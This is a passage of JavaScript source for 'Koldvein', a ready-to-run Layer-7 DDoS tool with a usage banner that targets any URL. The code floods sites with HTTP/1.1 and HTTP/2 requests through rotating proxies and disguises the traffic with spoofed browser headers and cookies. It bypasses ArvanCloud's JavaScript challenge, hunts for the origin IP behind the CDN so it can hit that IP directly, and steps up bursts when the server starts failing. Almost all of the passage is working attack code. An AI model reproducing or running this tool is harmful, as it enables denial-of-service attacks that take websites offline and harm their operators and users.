    sock.on('error',  ()=>cb(''));
    sock.setTimeout(12000, ()=>{ sock.destroy(); cb(''); });
}

function _processResponse(rawBuf, key, cb) {
    try {
        const raw = rawBuf.toString('binary');
        const sep = raw.indexOf('\r\n\r\n');
        if (sep===-1) { cb(''); return; }
        const hdrs = raw.slice(0, sep).toLowerCase();
        let   body = raw.slice(sep+4);
        if (hdrs.includes('transfer-encoding: chunked')) body = unchunk(body);
        if (!isArvanPage(body)) { BYPASS_CACHE.set(key,{str:'',ts:Date.now()}); cb(''); return; }
        const str = solveArvanChallenge(body);
        BYPASS_CACHE.set(key, { str, ts:Date.now() });
        cb(str);
    } catch { cb(''); }
}

// ═══════════════════════════════════════════════════════════════════════════════
// ORIGIN RESOLVER
// Finds the real server IP behind ArvanCloud CDN.
// Methods:
//   1. DNS A record of the hostname — ArvanCloud sometimes leaks origin on subdomains
//   2. Fetch common origin-reveal headers (X-Real-IP, X-Origin-IP, CF-Connecting-IP)
//      from an ArvanCloud edge hit
//   3. Try common origin subdomains: direct.*, origin.*, real.*, backend.*
//   4. Fallback: use hostname as-is (direct TLS without proxy)
// ═══════════════════════════════════════════════════════════════════════════════
const ORIGIN_SUBDOMAINS = ['direct','origin','real','backend','srv','host','source','api'];
const ORIGIN_CACHE = new Map();

function resolveOrigin(urlObj, cb) {
    const key = urlObj.hostname;
    if (ORIGIN_CACHE.has(key)) { cb(ORIGIN_CACHE.get(key)); return; }

    let found = null;
    let pending = 0;
    const done = ip => {
        if (found) return;
        found = ip;
        const result = { ip, port: urlObj.port ? +urlObj.port : 443, hostname: urlObj.hostname };
        ORIGIN_CACHE.set(key, result);
        cb(result);
    };

    // Method 1: direct DNS
    pending++;
    dns.resolve4(key, (err, addrs) => {
        if (!err && addrs && addrs.length > 0) {
            // ArvanCloud CDN ranges roughly: 185.143.234.x, 185.22.60.x, etc.
            // If it's NOT one of those, it might be origin
            const ip = addrs[0];
            if (!isArvanIP(ip)) { done(ip); return; }
        }
        if (--pending === 0 && !found) done(null);
    });

    // Method 2: subdomain DNS probes
    for (const sub of ORIGIN_SUBDOMAINS) {
        pending++;
        dns.resolve4(`${sub}.${key}`, (err, addrs) => {
            if (!err && addrs && addrs.length > 0 && !found) done(addrs[0]);
            if (--pending === 0 && !found) done(null);
        });
    }
}

// ArvanCloud ASN ranges (approximate — covers main CDN allocations)
function isArvanIP(ip) {
    const arvanPrefixes = [
        '185.143.234','185.22.60','185.2.0','94.101.182',
        '82.99.212','5.160.139','5.144.128',
    ];
    return arvanPrefixes.some(p => ip.startsWith(p));
}

// ═══════════════════════════════════════════════════════════════════════════════
// REDIRECT RESOLVER
// ═══════════════════════════════════════════════════════════════════════════════
const REDIRECT_CACHE = new Map();

function resolveRedirectChain(startUrl, proxy, genome, cb) {
    const cached = REDIRECT_CACHE.get(startUrl.href);
    if (cached) { cb(new URL(cached)); return; }
    let hops=0, cur=startUrl;
    function hop() {
        if (hops >= MAX_REDIRECTS) { REDIRECT_CACHE.set(startUrl.href, cur.href); cb(cur); return; }
        const {ph,pp} = splitProxy(proxy);
        if (!ph) { cb(startUrl); return; }
        const port = cur.port ? +cur.port : (cur.protocol==='https:' ? 443 : 80);
        const sock = net.connect(pp, ph, ()=>{
            sock.once('data', ()=>{
                const doReq = s => {
                    const req=`GET ${cur.pathname||'/'}${cur.search||''} HTTP/1.1\r\nHost: ${cur.hostname}\r\nUser-Agent: ${genome.profile.ua}\r\nAccept: */*\r\nConnection: close\r\n\r\n`;
                    let resp='';
                    s.write(req); s.setTimeout(6000);
                    s.on('timeout',()=>{ s.destroy(); REDIRECT_CACHE.set(startUrl.href,cur.href); cb(cur); });
                    s.on('error',  ()=>{ REDIRECT_CACHE.set(startUrl.href,cur.href); cb(cur); });
                    s.on('data', c=>{
                        resp+=c.toString('binary');
                        if(resp.includes('\r\n\r\n')||resp.length>8192) {
                            s.destroy();
                            const hdr  = resp.split('\r\n\r\n')[0];
                            const ls   = hdr.split('\r\n');
                            const code = parseInt((ls[0]||'').split(' ')[1]||'0');
                            if(code>=300&&code<400) {
                                const loc=(ls.find(l=>l.toLowerCase().startsWith('location:'))||'').slice(9).trim();
                                if(loc) try{ cur=new URL(loc,cur.href); hops++; setImmediate(hop); } catch{ REDIRECT_CACHE.set(startUrl.href,cur.href); cb(cur); }
                                else { REDIRECT_CACHE.set(startUrl.href,cur.href); cb(cur); }
                            } else { REDIRECT_CACHE.set(startUrl.href,cur.href); cb(cur); }
                        }
                    });
                };
                if(cur.protocol==='https:') {
                    const ts=tls.connect(makeTLSOpts(genome,{socket:sock,servername:cur.hostname,timeout:6000,ALPNProtocols:['http/1.1']}),()=>doReq(ts));
                    ts.on('error',()=>{ REDIRECT_CACHE.set(startUrl.href,cur.href); cb(cur); });
                } else doReq(sock);
            });
            sock.write(`CONNECT ${cur.hostname}:${port} HTTP/1.1\r\nHost: ${cur.hostname}:${port}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });
        sock.on('error',()=>{ REDIRECT_CACHE.set(startUrl.href,cur.href); cb(cur); });
        sock.setTimeout(8000,()=>{ sock.destroy(); REDIRECT_CACHE.set(startUrl.href,cur.href); cb(cur); });
    }
    hop();
}

// ═══════════════════════════════════════════════════════════════════════════════
// ADAPTIVE FLOOD ENGINE
// ═══════════════════════════════════════════════════════════════════════════════
let A = { delay:8, burst:3, jitter:0.04, timeout:6000, keepalive:18000, mode:'WARM' };
let W = { ok:0, s503:0, s429:0, s403:0, err:0, to:0, ga:0, rst:0, n:0 };

function tune() {
    const w=W; if(w.n<5) return;
    const ok=(w.ok)/w.n, s503=w.s503/w.n, blk=(w.s429+w.s403)/w.n,
          stress=(w.s503+w.err+w.to)/w.n, proto=(w.ga+w.rst)/w.n;
    if(s503>0.28||(s503+w.to/w.n)>0.50) {
        A.mode='HAMMER'; A.delay=Math.max(1,A.delay-4); A.burst=Math.min(26,A.burst+6);
        A.timeout=Math.max(2200,A.timeout-700); A.keepalive=Math.max(4000,A.keepalive-2500);
        A.jitter=Math.max(0.01,A.jitter-0.015);
    } else if(blk>0.30) {
        A.mode='EVADE'; A.delay=Math.min(25,A.delay+5); A.burst=Math.max(2,A.burst-2);
        A.timeout=Math.min(12000,A.timeout+600); A.keepalive=Math.min(30000,A.keepalive+2000);
        A.jitter=Math.min(0.50,A.jitter+0.12);
    } else if(stress>0.45) {
        A.mode='FLOOD'; A.delay=Math.max(2,A.delay-3); A.burst=Math.min(18,A.burst+3);
        A.keepalive=Math.max(6000,A.keepalive-1500);
    } else if(ok>0.60) {
        A.mode='RAMP'; A.delay=Math.max(1,A.delay-3); A.burst=Math.min(20,A.burst+4);
        A.timeout=Math.max(4000,A.timeout-400); A.jitter=Math.max(0.02,A.jitter-0.02);
    } else if(proto>0.12) {
        A.mode='THROTTLE'; A.burst=Math.max(3,A.burst-2); A.delay=Math.max(5,A.delay);
    } else {
        A.mode='WARM'; A.burst=Math.min(8,A.burst+1); A.delay=Math.max(4,A.delay-1);
    }
    W={ok:0,s503:0,s429:0,s403:0,err:0,to:0,ga:0,rst:0,n:0};
}

// ═══════════════════════════════════════════════════════════════════════════════
// H2 FRAME PRIMITIVES
// ═══════════════════════════════════════════════════════════════════════════════
const PREFACE   = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'binary');
const H2_HEADER = 262144;
const H2_WINDOW = 6291456;
const H2_TABLE  = 65535;
const H2_UPDATE = 15663105;

function frame(sid, type, payload=Buffer.alloc(0), flags=0) {
    const pl = Buffer.isBuffer(payload)?payload:Buffer.alloc(0);
    const f  = Buffer.allocUnsafe(9+pl.length);
    f.writeUInt32BE((pl.length<<8)|type,0); f.writeUInt8(flags,4); f.writeUInt32BE(sid,5);
    if(pl.length) pl.copy(f,9);
    return f;
}
function decodeFrame(buf) {
    if(!buf||buf.length<9) return null;
    const lt=buf.readUInt32BE(0), len=lt>>8, type=lt&0xFF, flags=buf.readUInt8(4), sid=buf.readUInt32BE(5);
    const off=(flags&0x20)?5:0;
    if(buf.length<9+off+len) return null;
    return {sid,len,type,flags,payload:buf.subarray(9+off,9+off+len)};
}
function encSettings(s){ const b=Buffer.allocUnsafe(s.length*6); s.forEach(([id,v],i)=>{b.writeUInt16BE(id,i*6);b.writeUInt32BE(v,i*6+2);}); return b; }

const WU=Buffer.allocUnsafe(4); WU.writeUInt32BE(H2_UPDATE,0);
const H2_INIT=Buffer.concat([
    PREFACE,
    frame(0,4,encSettings([[1,H2_HEADER],[2,0],[4,H2_WINDOW],[6,H2_TABLE]])),
    frame(0,8,WU),
]);

// ═══════════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════════
const rnd    = a => a[Math.floor(Math.random()*a.length)];
const rndInt = (lo,hi) => lo+Math.floor(Math.random()*(hi-lo+1));
const jit    = base => base*(1+(Math.random()*A.jitter*2-A.jitter));
function splitProxy(p){ const s=(p||'').trim(),c=s.lastIndexOf(':'); if(c<=0) return {ph:null,pp:0}; const pp=parseInt(s.slice(c+1)); return isNaN(pp)?{ph:null,pp:0}:{ph:s.slice(0,c),pp}; }
function mutPath(p){ const r=Math.random(); if(r>0.82) return p+'?'+Math.random().toString(36).slice(2,9); if(r>0.62) return p+'?t='+Date.now().toString(36)+'&r='+Math.random().toString(36).slice(2,6); if(r>0.40) return p+'?_='+Math.random().toString(36).slice(2,8); return p; }

const REFS=['https://www.google.com/','https://l.instagram.com/','https://lm.facebook.com/','https://t.co/','https://www.tiktok.com/','https://www.youtube.com/','https://www.reddit.com/','https://www.snapchat.com/','https://www.twitter.com/','https://www.google.co.uk/','https://www.google.de/'];

function buildH1(genome, urlObj, bypass, withCookies) {
    const p=genome.profile, path=mutPath(urlObj.pathname), ref=Math.random()>0.35?rnd(REFS):null;
    const cookie=[bypass,withCookies?getCookieForProfile(p):''].filter(Boolean).join('; ');
    let h=`GET ${path} HTTP/1.1\r\nHost: ${urlObj.hostname}\r\nUser-Agent: ${p.ua}\r\nAccept: ${p.accept}\r\nAccept-Encoding: ${p.acceptEnc}\r\nAccept-Language: ${p.acceptLang}\r\n`;
    if(ref) h+=`Referer: ${ref}\r\n`;
    if(p.chua) h+=`sec-ch-ua: ${p.chua}\r\nsec-ch-ua-mobile: ${p.secMobile}\r\nsec-ch-ua-platform: ${p.platformHint}\r\n`;
    h+=`Sec-Fetch-Dest: ${p.fetchDest}\r\nSec-Fetch-Mode: ${p.fetchMode}\r\nSec-Fetch-Site: ${p.fetchSite}\r\n`;
    if(p.fetchUser) h+=`Sec-Fetch-User: ${p.fetchUser}\r\n`;
    if(p.platform==='Android'&&p.browser!=='Firefox') h+=`Viewport-Width: ${p.vw}\r\nDPR: ${p.dpr}\r\n`;
    h+=`Cache-Control: max-age=0\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n`;
    if(cookie) h+=`Cookie: ${cookie}\r\n`;
    h+='\r\n';
    return Buffer.from(h,'ascii');
}

function buildH2(genome, urlObj, bypass, withCookies) {
    const p=genome.profile, path=mutPath(urlObj.pathname), ref=Math.random()>0.35?rnd(REFS):null;
    const cookie=[bypass,withCookies?getCookieForProfile(p):''].filter(Boolean).join('; ');
    const h=[[':method','GET'],[':authority',urlObj.hostname],[':scheme','https'],[':path',path],
        ['user-agent',p.ua],['accept',p.accept],['accept-encoding',p.acceptEnc],
        ['accept-language',p.acceptLang],['cache-control','max-age=0'],['upgrade-insecure-requests','1']];
    if(ref) h.push(['referer',ref]);
    if(p.chua) h.push(['sec-ch-ua',p.chua],['sec-ch-ua-mobile',p.secMobile],['sec-ch-ua-platform',p.platformHint]);
    h.push(['sec-fetch-dest',p.fetchDest],['sec-fetch-mode',p.fetchMode],['sec-fetch-site',p.fetchSite]);
    if(p.fetchUser) h.push(['sec-fetch-user',p.fetchUser]);
    if(p.platform==='Android'&&p.browser!=='Firefox') h.push(['viewport-width',String(p.vw)],['dpr',p.dpr]);
    if(cookie) h.push(['cookie',cookie]);
    return h;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CLI
// ═══════════════════════════════════════════════════════════════════════════════
const argv = process.argv.slice(2);
const O = {
    cookies:  argv.includes('-c'),
    version:  argv.includes('-v') ? argv[argv.indexOf('-v')+1] : '2',
    silent:   argv.includes('-s'),
    redirect: argv.includes('-redirect'),
    bypass:   argv.includes('-bypass'),
    origin:   argv.includes('-origin'),
};

// ═══════════════════════════════════════════════════════════════════════════════
// STATS
// ═══════════════════════════════════════════════════════════════════════════════
let S={ req:0, ok:0, s5xx:0, byp:0, ga:0, rst:0, to:0, err:0, s503:0 };

function rec(code, genePool, gid, proxy) {
    W.n++;
    if(code>=200&&code<300){ S.ok++; W.ok++; genePool.reward(gid,+2); }
    else if(code===503)     { S.s503++; S.s5xx++; W.s503++; genePool.reward(gid,+3); /* server gasping = this genome gets through */ }
    else if(code===429)     { W.s429++; genePool.reward(gid,-1); }
    else if(code===403)     { W.s403++; genePool.reward(gid,-3); }
    else if(code>=500)      { S.s5xx++; W.err++; genePool.reward(gid,-0.5); }
}

// ═══════════════════════════════════════════════════════════════════════════════
// CONNECTION LOOP
// ═══════════════════════════════════════════════════════════════════════════════
function go(origUrl, proxies, rate, pool, originInfo) {
    const proxy  = proxies[Math.floor(Math.random()*proxies.length)];
    if(!proxy) { setTimeout(()=>go(origUrl,proxies,rate,pool,originInfo),100); return; }

    const genome  = pool.pick();
    const {ph,pp} = splitProxy(proxy);
    if(!ph) { setTimeout(()=>go(origUrl,proxies,rate,pool,originInfo),80); return; }

    const curTO=A.timeout, curKA=A.keepalive, curD=A.delay, curB=A.burst;

    function flood(urlObj, bypass) {
        // -origin: connect directly to resolved origin IP, skip CDN edge entirely
        const connectHost = (O.origin && originInfo && originInfo.ip) ? originInfo.ip : ph;
        const connectPort = (O.origin && originInfo && originInfo.ip) ? originInfo.port : pp;
        const tlsServername = urlObj.hostname;  // SNI always the real hostname

        let sock;
        if(O.origin && originInfo && originInfo.ip) {
            // Direct connection — no proxy tunnel
            const tlsOpts = makeTLSOpts(genome, {
                host: connectHost, port: connectPort,
                servername: tlsServername,
                ALPNProtocols: O.version==='1' ? ['http/1.1'] : ['h2','http/1.1'],
                timeout: curTO,
            });
            const tlsSock = tls.connect(tlsOpts, ()=>_doFlood(tlsSock, urlObj, bypass, genome, proxy, pool, origUrl, proxies, rate, originInfo));
            tlsSock.on('error', ()=>{ S.err++; W.err++; W.n++; pool.reward(genome.id,-0.5); setTimeout(()=>go(origUrl,proxies,rate,pool,originInfo),80); });
            tlsSock.setTimeout(curKA, ()=>{ W.to++; W.n++; tlsSock.destroy(); setTimeout(()=>go(origUrl,proxies,rate,pool,originInfo),80); });
            return;
        }

        // Proxy tunnel
        sock = net.connect(pp, ph, ()=>{
            sock.once('data', ()=>{
                const tlsOpts = makeTLSOpts(genome, {
                    socket: sock, servername: tlsServername,
                    ALPNProtocols: O.version==='1' ? ['http/1.1'] : ['h2','http/1.1'],
                    timeout: curTO,
                });
                const tlsSock = tls.connect(tlsOpts, ()=>_doFlood(tlsSock, urlObj, bypass, genome, proxy, pool, origUrl, proxies, rate, originInfo));
                tlsSock.on('error', ()=>{ S.err++; W.err++; W.n++; pool.reward(genome.id,-0.5); sock.destroy(); });
            });
            sock.write(`CONNECT ${urlObj.hostname}:443 HTTP/1.1\r\nHost: ${urlObj.hostname}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });
        sock.on('error', ()=>{ S.err++; W.err++; W.n++; pool.reward(genome.id,-0.5); sock.destroy(); setTimeout(()=>go(origUrl,proxies,rate,pool,originInfo),80); });
        sock.setTimeout(curKA, ()=>{ W.to++; W.n++; sock.destroy(); setTimeout(()=>go(origUrl,proxies,rate,pool,originInfo),80); });
    }

    function _doFlood(tlsSock, urlObj, bypass, genome, proxy, pool, origUrl, proxies, rate, originInfo) {
        const isH1 = !tlsSock.alpnProtocol || tlsSock.alpnProtocol==='http/1.1' || O.version==='1';
        if(isH1) {
            function w(){
                if(tlsSock.destroyed) return;
                const bufs=[];
                for(let i=0;i<curB;i++) bufs.push(buildH1(genome,urlObj,bypass,O.cookies));
                tlsSock.write(Buffer.concat(bufs), e=>{
                    if(!e){ S.req+=curB; setTimeout(w,jit(1000/rate)); }
                    else { S.err++; W.err++; W.n++; pool.reward(genome.id,-0.5); tlsSock.destroy(); }
                });
            }
            tlsSock.on('data', chunk=>{
                const s=chunk.toString('binary',0,16), i=s.indexOf(' ');
                if(i>0) rec(parseInt(s.slice(i+1,i+4)), pool, genome.id, proxy);
            });
            w();
            tlsSock.on('error', ()=>{ S.err++; W.err++; W.n++; pool.reward(genome.id,-0.5); tlsSock.destroy(); });
            tlsSock.on('close', ()=>setTimeout(()=>go(origUrl,proxies,rate,pool,originInfo),80));
            return;
        }

        // H2
        let sid=1, ibuf=Buffer.alloc(0);
        const hpack=new HPACK();
        hpack.setTableSize(4096);

        tlsSock.on('data', data=>{
            ibuf=Buffer.concat([ibuf,data]);
            while(ibuf.length>=9){
                const f=decodeFrame(ibuf); if(!f) break;
                ibuf=ibuf.subarray(f.len+9);
                if(f.type===4&&f.flags===0) tlsSock.write(frame(0,4,Buffer.alloc(0),1));
                if(f.type===7){ S.ga++; W.ga++; W.n++; pool.reward(genome.id,-1); tlsSock.destroy(); }
                if(f.type===5){ S.rst++; W.rst++; W.n++; pool.reward(genome.id,-1); tlsSock.destroy(); }
                if(f.type===1&&f.payload.length>0){
                    try{
                        const dec=hpack.decode(f.payload);
                        const st=dec.find(h=>h[0]===':status');
                        if(st) rec(parseInt(st[1]), pool, genome.id, proxy);
                    }catch{}
                }
            }
        });

        tlsSock.write(H2_INIT);
        function w(){
            if(tlsSock.destroyed) return;
            const batch=[];
            for(let b=0;b<curB;b++){
                const hdrs=buildH2(genome,urlObj,bypass,O.cookies);
                const packed=Buffer.concat([Buffer.from([0x80,0,0,0,0xFF]),hpack.encode(hdrs)]);
                batch.push(frame(sid,1,packed,0x25));
                sid+=2;
            }
            tlsSock.write(Buffer.concat(batch), e=>{
                if(!e){ S.req+=curB; setTimeout(w,jit(curD)); }
                else { S.err++; W.err++; W.n++; pool.reward(genome.id,-0.5); tlsSock.destroy(); }
            });
        }
        w();
        tlsSock.on('error', ()=>{ S.err++; W.err++; W.n++; pool.reward(genome.id,-0.5); tlsSock.destroy(); });
        tlsSock.on('close', ()=>setTimeout(()=>go(origUrl,proxies,rate,pool,originInfo),80));
    }

    // pipeline: redirect → bypass → flood
    function withUrl(urlObj) {
        if(O.bypass) {
            runBypassPreflight(urlObj, proxy, genome, str=>{
                if(str) S.byp++;
                flood(urlObj, str);
            });
        } else {
            flood(urlObj, '');
        }
    }

    if(O.redirect) {
        resolveRedirectChain(origUrl, proxy, genome, resolved=>withUrl(resolved));
    } else {
        withUrl(origUrl);
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// ENTRY CHECK
// ═══════════════════════════════════════════════════════════════════════════════
if(process.argv.length < 6) {
    const R='\x1b[31m', W='\x1b[37m', D='\x1b[90m', X='\x1b[0m';
    process.stdout.write(`\n${R}  Koldvein${X} ${D}— AI-Adaptive L7 + ArvanCloud Bypass${X}\n\n`);
    process.stdout.write(`  ${W}Usage:${X}  node Koldvein.js <target> <duration> <proxies.txt> <threads> <rate> [opts]\n\n`);
    process.stdout.write(`  ${W}Options:${X}\n`);
    process.stdout.write(`    ${W}-bypass${X}    Solve ArvanCloud JS challenge (vm sandbox, 24min cache per slot)\n`);
    process.stdout.write(`    ${W}-redirect${X}  Follow redirect chain to origin before flooding\n`);
    process.stdout.write(`    ${W}-origin${X}    Resolve real origin IP behind ArvanCloud CDN, flood direct\n`);
    process.stdout.write(`    ${W}-c${X}         Inject realistic browser session cookies per request\n`);
    process.stdout.write(`    ${W}-v <1|2>${X}   HTTP version (default: 2)\n`);
    process.stdout.write(`    ${W}-s${X}         Silent\n\n`);
    process.stdout.write(`  ${W}Example:${X}\n`);
    process.stdout.write(`    node Koldvein.js https://target.com 120 proxies.txt 100 64 -bypass -redirect -c\n\n`);
    process.exit(1);
}

const target    = process.argv[2];
const duration  = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const threads   = parseInt(process.argv[5]);
const rate      = parseInt(process.argv[6]) || 64;
const urlObj    = new URL(target);

let proxies=[];
try { proxies=fs.readFileSync(proxyFile,'utf-8').split('\n').filter(l=>l.trim().includes(':')); }
catch { process.stderr.write('\x1b[31merror: cannot read proxy file\x1b[0m\n'); process.exit(1); }

// ═══════════════════════════════════════════════════════════════════════════════
// MASTER
// ═══════════════════════════════════════════════════════════════════════════════
if(cluster.isMaster) {
    console.clear();

    const R='\x1b[31m', D='\x1b[90m', W='\x1b[37m', X='\x1b[0m';

    // static header — printed once
    process.stdout.write(`\n${R}  ██╗  ██╗ ██████╗ ██╗     ██████╗ ██╗   ██╗███████╗██╗███╗   ██╗${X}\n`);
    process.stdout.write(`${R}  ██║ ██╔╝██╔═══██╗██║     ██╔══██╗██║   ██║██╔════╝██║████╗  ██║${X}\n`);
    process.stdout.write(`${R}  █████╔╝ ██║   ██║██║     ██║  ██║██║   ██║█████╗  ██║██╔██╗ ██║${X}\n`);
    process.stdout.write(`${R}  ██╔═██╗ ██║   ██║██║     ██║  ██║╚██╗ ██╔╝██╔══╝  ██║██║╚██╗██║${X}\n`);
    process.stdout.write(`${R}  ██║  ██╗╚██████╔╝███████╗██████╔╝ ╚████╔╝ ███████╗██║██║ ╚████║${X}\n`);
    process.stdout.write(`${R}  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═════╝   ╚═══╝  ╚══════╝╚═╝╚═╝  ╚═══╝${X}\n\n`);
    process.stdout.write(`${D}  ─────────────────────────────────────────────────────────────────${X}\n`);
    process.stdout.write(`${R}  Attack sent!${X}\n`);
    process.stdout.write(`${W}  Host     :${X} ${target}\n`);
    process.stdout.write(`${W}  Duration :${X} ${duration}s\n`);
    process.stdout.write(`${D}  ─────────────────────────────────────────────────────────────────${X}\n\n`);
    process.stdout.write(`${R}  Requests stats:${X}\n`);

    // 4 stat lines — will be rewritten in place
    const STAT_LINES = 4;
    const statLabels = ['  Total    :', '  2xx      :', '  5xx      :', '  Bypassed :'];
    // print initial blank lines
    for(let i=0;i<STAT_LINES;i++) process.stdout.write(`\x1b[31m${statLabels[i]}\x1b[0m 0\n`);

    let A2={ req:0, ok:0, s5xx:0, byp:0 }, prevReq=0;

    function spawnW() {
        const w=cluster.fork({ ADAPTIVE:JSON.stringify(A) });
        w.on('message', msg=>{
            if(msg.type!=='stats') return;
            A2.req+=msg.req; A2.ok+=msg.ok; A2.s5xx+=msg.s5xx; A2.byp+=msg.byp;
            // merge window
            W.ok+=msg.wok; W.s503+=msg.ws503; W.s429+=msg.ws429; W.s403+=msg.ws403;
            W.err+=msg.werr; W.to+=msg.wto; W.ga+=msg.wga; W.rst+=msg.wrst; W.n+=msg.wn;
        });
        return w;
    }

    let workers=Array.from({length:threads}, spawnW);
    let restarting=false;

    // RAM watchdog
    const ramW=setInterval(()=>{
        if(restarting||1-os.freemem()/os.totalmem()<RAM_KILL_PCT) return;
        restarting=true;
        workers.forEach(w=>{try{w.kill('SIGKILL');}catch{}});
        setTimeout(()=>{
            workers=[];
            for(let i=0;i<threads;i++) setTimeout(()=>workers.push(spawnW()), i*RESTART_STAGGER);
            setTimeout(()=>restarting=false, threads*RESTART_STAGGER+300);
        }, 400);
    }, RAM_WATCH_MS);

    // tune broadcast
    const tuneLoop=setInterval(()=>{
        tune();
        const msg={type:'adapt',state:A};
        workers.forEach(w=>{try{w.send(msg);}catch{}});
    }, TUNE_MS);

    // display — rewrite 4 lines in place, never append
    const dispLoop=setInterval(()=>{
        if(O.silent) return;
        const rps=A2.req-prevReq; prevReq=A2.req;
        const vals=[A2.req, A2.ok, A2.s5xx, O.bypass?A2.byp:null];
        process.stdout.write(`\x1b[${STAT_LINES}A`);  // cursor up
        for(let i=0;i<STAT_LINES;i++){
            if(vals[i]===null) { process.stdout.write(`\x1b[2K\x1b[31m${statLabels[i]}\x1b[90m —\x1b[0m\n`); continue; }
            process.stdout.write(`\x1b[2K\x1b[31m${statLabels[i]}\x1b[0m ${vals[i]}${i===0?' \x1b[90m('+rps+'/s)\x1b[0m':''}\n`);
        }
    }, 1000);

    // end
    setTimeout(()=>{
        clearInterval(tuneLoop); clearInterval(dispLoop); clearInterval(ramW);
        workers.forEach(w=>{try{w.kill();}catch{}});
        if(!O.silent) {
            process.stdout.write(`\x1b[${STAT_LINES}A`);
            for(let i=0;i<STAT_LINES;i++){
                const vals=[A2.req,A2.ok,A2.s5xx,A2.byp];
                process.stdout.write(`\x1b[2K\x1b[31m${statLabels[i]}\x1b[0m ${O.bypass||i<3?vals[i]:'—'}\n`);
            }
            process.stdout.write('\n\x1b[90m  done.\x1b[0m\n\n');
        }
        process.exit(0);
    }, duration*1000);

} else {
    // ── WORKER ────────────────────────────────────────────────────────────────
    try { Object.assign(A, JSON.parse(process.env.ADAPTIVE||'{}')); } catch {}
    process.on('message', msg=>{ if(msg?.type==='adapt') Object.assign(A,msg.state); });

    // heap watchdog
    setInterval(()=>{
        const m=process.memoryUsage(); let lim=1.5*1024**3;
        try{lim=require('v8').getHeapStatistics().heap_size_limit;}catch{}
        if(m.heapUsed/lim>=HEAP_KILL_PCT) process.exit(0);
    }, RAM_WATCH_MS);

    const pool = new GenePool(AI_POOL_SIZE);

    // AI genome evolution loop
    setInterval(()=>pool.evolve(), AI_LEARN_MS);

    // resolve origin IP once per worker if -origin
    let originInfo = null;
    if(O.origin) {
        resolveOrigin(urlObj, info=>{
            originInfo = info;
        });
    }

    setTimeout(()=>{
        setInterval(()=>go(urlObj, proxies, rate, pool, originInfo), 1000/rate);
    }, Math.random()*1200);

    setInterval(()=>{
        try {
            process.send({
                type:'stats',
                req:S.req, ok:S.ok, s5xx:S.s5xx, byp:S.byp,
                wok:W.ok, ws503:W.s503, ws429:W.s429, ws403:W.s403,
                werr:W.err, wto:W.to, wga:W.ga, wrst:W.rst, wn:W.n,
            });
        } catch {}
        S={req:0,ok:0,s5xx:0,byp:0,ga:0,rst:0,to:0,err:0,s503:0};
        W={ok:0,s503:0,s429:0,s403:0,err:0,to:0,ga:0,rst:0,n:0};
    }, STATS_MS);
}
